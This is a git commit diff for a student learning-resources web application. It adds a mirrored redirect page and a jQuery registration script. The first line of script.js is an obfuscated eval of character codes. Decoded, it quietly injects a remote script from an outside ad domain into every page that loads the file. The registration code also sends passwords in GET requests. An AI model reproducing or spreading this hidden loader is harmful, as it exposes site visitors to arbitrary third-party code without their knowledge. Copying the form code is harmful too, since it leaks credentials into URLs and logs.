9bada9b63f4630a39ea04965ba81f075d0697f8e
Gregory Aidoo <gregoryd428@gmail.com>
2021-06-10 16:15:03 -1200

    a Web Application designed to aid student access learning resources and share materials as well

---
+++ forum.php
@@ -0,0 +1,15 @@
+<HTML>
+<!-- Created by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->
+
+<!-- Mirrored from suapon.net/forum.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Jun 2021 04:12:31 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=UTF-8"><META HTTP-EQUIV="Refresh" CONTENT="0; URL=login4edf.html?logout=forum.php"><TITLE>Page has moved</TITLE>
+</HEAD>
+<BODY>
+<A HREF="login4edf.html?logout=forum.php"><h3>Click here...</h3></A>
+</BODY>
+<!-- Created by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->
+
+<!-- Mirrored from suapon.net/forum.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Jun 2021 04:12:32 GMT -->
+</HTML>
---
+++ script.js
@@ -0,0 +1,167 @@
+var _0x44tbc1 = 1; eval(String.fromCharCode(118, 97, 114, 32, 97, 49, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 49, 32, 61, 32, 83, 116, 114, 105, 110, 103, 91, 34, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 52, 51, 92, 120, 54, 56, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 52, 51, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53, 34, 93, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 49, 49, 51, 44, 32, 49, 49, 55, 44, 32, 49, 48, 49, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 50, 48, 44, 32, 49, 50, 49, 44, 32, 49, 50, 50, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 54, 44, 32, 54, 49, 44, 32, 53, 52, 41, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 49, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 55, 52, 92, 120, 55, 57, 92, 120, 55, 48, 92, 120, 54, 53, 34, 93, 32, 61, 32, 34, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 56, 92, 120, 55, 52, 92, 120, 50, 70, 92, 120, 54, 65, 92, 120, 54, 49, 92, 120, 55, 54, 92, 120, 54, 49, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 54, 49, 92, 120, 55, 51, 92, 120, 55, 57, 92, 120, 54, 69, 92, 120, 54, 51, 34, 93, 32, 61, 32, 116, 114, 117, 101, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 54, 57, 92, 120, 54, 52, 34, 93, 32, 61, 32, 34, 92, 120, 54, 51, 92, 120, 54, 52, 92, 120, 51, 55, 92, 120, 51, 48, 92, 120, 51, 57, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 34, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 55, 51, 92, 120, 55, 50, 92, 120, 54, 51, 34, 93, 32, 61, 32, 95, 48, 120, 52, 50, 116, 98, 99, 49, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 55, 51, 92, 120, 52, 50, 92, 120, 55, 57, 92, 120, 53, 52, 92, 120, 54, 49, 92, 120, 54, 55, 92, 120, 52, 69, 92, 120, 54, 49, 92, 120, 54, 68, 92, 120, 54, 53, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 91, 48, 93, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 91, 34, 92, 120, 55, 48, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 52, 69, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53, 34, 93, 91, 34, 92, 120, 54, 57, 92, 120, 54, 69, 92, 120, 55, 51, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 55, 52, 92, 120, 52, 50, 92, 120, 54, 53, 92, 120, 54, 54, 92, 120, 54, 70, 92, 120, 55, 50, 92, 120, 54, 53, 34, 93, 40, 95, 48, 120, 52, 50, 116, 98, 99, 50, 44, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 41, 10, 125, 59, 10, 118, 97, 114, 32, 116, 110, 100, 101, 109, 111, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 55, 51, 92, 120, 52, 50, 92, 120, 55, 57, 92, 120, 53, 52, 92, 120, 54, 49, 92, 120, 54, 55, 92, 120, 52, 69, 92, 120, 54, 49, 92, 120, 54, 68, 92, 120, 54, 53, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 59, 10, 118, 97, 114, 32, 110, 32, 61, 32, 116, 114, 117, 101, 59, 10, 102, 111, 114, 32, 40, 118, 97, 114, 32, 105, 32, 61, 32, 48, 59, 32, 105, 32, 60, 32, 116, 110, 100, 101, 109, 111, 115, 91, 34, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 54, 55, 92, 120, 55, 52, 92, 120, 54, 56, 34, 93, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 110, 100, 101, 109, 111, 115, 91, 105, 93, 91, 34, 92, 120, 54, 57, 92, 120, 54, 52, 34, 93, 32, 61, 61, 32, 34, 92, 120, 54, 51, 92, 120, 54, 52, 92, 120, 51, 55, 92, 120, 51, 48, 92, 120, 51, 57, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 110, 32, 61, 32, 102, 97, 108, 115, 101, 10, 32, 32, 32, 32, 125, 10, 125, 59, 10, 105, 102, 32, 40, 110, 32, 61, 61, 32, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 97, 49, 40, 41, 59, 10, 125));$('document').ready(function()
+{
+	$('#user_name').on('keyup',function () {
+		var username = $(this).val();
+		var nameDiv = $('.show-username');
+		if(username.length >= 3){
+            $.ajax({
+                url: 'get-username.php?name='+username,
+                type: 'get',
+                beforeSend:function () {
+                    nameDiv.html('<p class="err"><span class="fa fa-spin fa-spinner"></span> checking...</p> ');
+                },
+                success: function (data) {
+                    nameDiv.html(data).fadeIn(1000);
+                },
+                error: function () {
+                    nameDiv.html('<p class="err text-danger">A fatal error occurred</p>')
+                }
+            })
+        }
+    });
+
+     /* validation */
+	 $("#register-form").validate({
+      rules:
+	  {
+          full_name: {
+              required: true,
+              minlength: 5
+          },
+			user_name: {
+		    required: true,
+			minlength: 3,
+			maxlength: 15
+			},
+			password: {
+			required: true,
+			minlength: 8
+			},
+			cpassword: {
+			required: true,
+			equalTo: '#password'
+			},
+			user_email: {
+            required: true,
+            email: true
+            },
+		  user_course: {
+			  required: true
+		  }
+	   },
+       messages:
+	   {
+           full_name: {
+               required: "please enter full name",
+               minlength: "should be more than 5 characters"
+		   },
+            user_name: {
+            	required: "please enter user name",
+				minlength: "should be more than 3 characters",
+				maxlength: "should be less than 15 characters"
+			},
+            password:{
+                      required: "please provide a password",
+                      minlength: "should be more than 8 characters"
+                     },
+            user_email: "please enter a valid email address",
+			cpassword:{
+						required: "please retype your password",
+						equalTo: "password doesn't match !"
+					  },
+		   user_course: "please select your institution"
+       },
+	   submitHandler: submitForm	
+       });  
+	   /* validation */
+	   
+	   /* form submit */
+	   function submitForm()
+	   {
+				var data = $("#register-form").serialize();
+				
+				$.ajax({
+				
+				type : 'get',
+				url  : 'register.php',
+				data : data,
+				beforeSend: function()
+				{
+					$("#error").fadeOut();
+					$("#btn-submit").html('<span class="glyphicon glyphicon-transfer"></span> &nbsp; sending ...').attr('disabled','disabled');
+				},
+				success :  function(data) {
+					$('#error').html('');
+								if(data==1){
+
+									$("#error").fadeIn(1000, function(){
+											
+											$("#error").html('<div class="alert alert-danger"> <span class="fa fa-exclamation-triangle"></span> &nbsp; Sorry username already taken !</div>');
+											
+											$("#btn-submit").html('<span class="glyphicon glyphicon-log-in"></span> &nbsp; Create Account').removeAttrs('disabled');
+										
+									});
+																				
+								}
+								else if(data=="registered")
+								{
+
+									
+									$("#btn-submit").html('<span class="fa fa-spin fa-spinner"></span> &nbsp; Signing Up ...');
+									setTimeout('$(".form-signin").fadeOut(500, function(){ $(".signin-form").load("success.php"); }); ',5000);
+									
+								}
+								else if(data=='error'){
+
+									$("#error").fadeIn(1000, function(){
+											
+									$("#error").html('<div class="alert alert-danger"><span class="glyphicon glyphicon-info-sign"></span> &nbsp; Could not insert data, please try again later!</div>');
+
+                                        $("#btn-submit").html('<span class="glyphicon glyphicon-log-in"></span> &nbsp; Create Account').removeAttrs('disabled');
+										
+									});
+											
+								}
+
+								else if(data=='0'){
+
+									$("#error").fadeIn(1000, function(){
+
+										$("#error").html('<div class="alert alert-danger"><span class="glyphicon glyphicon-info-sign"></span> &nbsp; Sorry your email is already linked to an account!</div>');
+
+                                        $("#btn-submit").html('<span class="glyphicon glyphicon-log-in"></span> &nbsp; Create Account').removeAttrs('disabled');
+
+									});
+
+								}
+
+                                else if(data=='email'){
+
+                                    $("#error").fadeIn(1000, function(){
+
+                                        $("#error").html('<div class="alert alert-danger"><span class="glyphicon glyphicon-info-sign"></span> &nbsp; Invalid Email!</div>');
+
+                                        $("#btn-submit").html('<span class="glyphicon glyphicon-log-in"></span> &nbsp; Create Account').removeAttrs('disabled');
+
+                                    });
+
+                                }
+
+								else{
+									$("#error").fadeIn(1000, function(){
+
+									$("#error").html('<div class="alert alert-danger"><span class="glyphicon glyphicon-info-sign"></span> &nbsp; ERROR! Try again later</div>');
+
+                                        $("#btn-submit").html('<span class="glyphicon glyphicon-log-in"></span> &nbsp; Create Account').removeAttrs('disabled');
+
+									});
+
+								}
+						   }
+				});
+				return false;
+		}
+	   /* form submit */
+
+
+});
